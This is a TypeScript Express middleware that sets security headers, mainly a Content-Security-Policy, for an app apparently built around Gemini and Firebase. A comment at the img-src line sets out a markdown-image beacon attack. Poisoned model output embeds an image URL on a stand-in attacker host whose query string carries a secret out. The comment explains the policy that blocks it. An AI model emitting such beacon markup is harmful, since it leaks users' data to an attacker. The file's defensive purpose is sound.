import { Request, Response, NextFunction } from 'express';

/**
 * Security headers — Constitution §3.
 *
 * A note on risk, because this is the one place a header can take the whole app
 * down: the Content-Security-Policy governs what the browser will load and
 * connect to, and Firebase Auth's Google Sign-In popup talks to a specific set
 * of Google origins. Too strict a policy and sign-in silently fails, which for
 * a demo is worse than no CSP at all. The connect-src and frame-src below are
 * sized to exactly those origins and no wider.
 *
 * Set CSP_DISABLED=1 to ship everything except the CSP, as an escape hatch if a
 * policy problem surfaces during judging and there is no time to debug it. The
 * other headers are zero-risk and always on.
 */

/**
 * script-src carries no 'unsafe-inline'. The build emits external module
 * scripts only (verified: dist/index.html has no inline <script>), so this
 * costs nothing and closes the main XSS vector.
 *
 * style-src DOES allow 'unsafe-inline'. React writes some style attributes, and
 * Tailwind's runtime does too. This is a deliberate, documented exception: the
 * injection risk 'unsafe-inline' style normally carries is XSS via
 * attacker-controlled style, and this app never renders untrusted content as
 * HTML (INV-9) — untrusted text is escaped text, never markup, so it cannot
 * introduce a style attribute in the first place. The residual risk is
 * therefore our own code, not the attacker's.
 */
const CSP = [
  "default-src 'self'",
  "script-src 'self' https://apis.google.com https://www.gstatic.com https://www.google.com",
  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
  "font-src 'self' https://fonts.gstatic.com",
  // Narrowed from `https:` deliberately, and this is the most security-relevant
  // line in the file.
  //
  // The headline attack against this app is the markdown-image beacon: poisoned
  // model output emits `![](https://attacker.example/x?d=SECRET)`, the browser
  // fetches it on paint, and the query string carries data out. No tool call,
  // no capability, no grant.
  //
  // INV-9 stops it in the renderer, which never emits an <img> at all. But
  // `img-src https:` meant that if the renderer ever regressed — someone
  // reaches for a markdown library to get prettier chat bubbles — the browser
  // would happily make that request and there was nothing behind it. A defence
  // with no second layer under the project's own headline threat.
  //
  // The only external image the app actually loads is the signed-in user's
  // Google avatar, so the allowance is exactly that. An attacker cannot
  // exfiltrate through googleusercontent.com either: they can host an image
  // there, but the query string never reaches a server they control.
  "img-src 'self' data: https://*.googleusercontent.com",
  // The Firebase/Google origins the client actually talks to. Gemini is called
  // server-side only, so no model origin appears here.
  "connect-src 'self' https://*.googleapis.com https://*.firebaseio.com " +
    'https://securetoken.googleapis.com https://identitytoolkit.googleapis.com ' +
    'https://firestore.googleapis.com https://www.googleapis.com',
  // The sign-in popup and its handler.
  "frame-src 'self' https://*.firebaseapp.com https://accounts.google.com https://apis.google.com",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
  "frame-ancestors 'none'",
].join('; ');

export function securityHeaders(_req: Request, res: Response, next: NextFunction): void {
  // Never let a response be re-typed by the browser into something executable.
  res.setHeader('X-Content-Type-Options', 'nosniff');
  // No referrer leaks to third parties.
  res.setHeader('Referrer-Policy', 'no-referrer');
  // Clickjacking: this app is never framed. Belt to CSP's frame-ancestors.
  res.setHeader('X-Frame-Options', 'DENY');
  // Turn off powerful features the app never uses.
  //
  // microphone is (self), not (): the journal editor offers speech-to-text
  // dictation via the Web Speech API. Denying it outright would have silently
  // broken a shipped feature - the button would appear and simply do nothing,
  // which is worse than not offering it. Everything the app genuinely never
  // touches stays fully denied.
  res.setHeader(
    'Permissions-Policy',
    'geolocation=(), microphone=(self), camera=(), payment=(), usb=()',
  );
  // Cloud Run terminates TLS; tell browsers to stay on HTTPS.
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');

  if (process.env.CSP_DISABLED !== '1') {
    res.setHeader('Content-Security-Policy', CSP);
  }

  next();
}
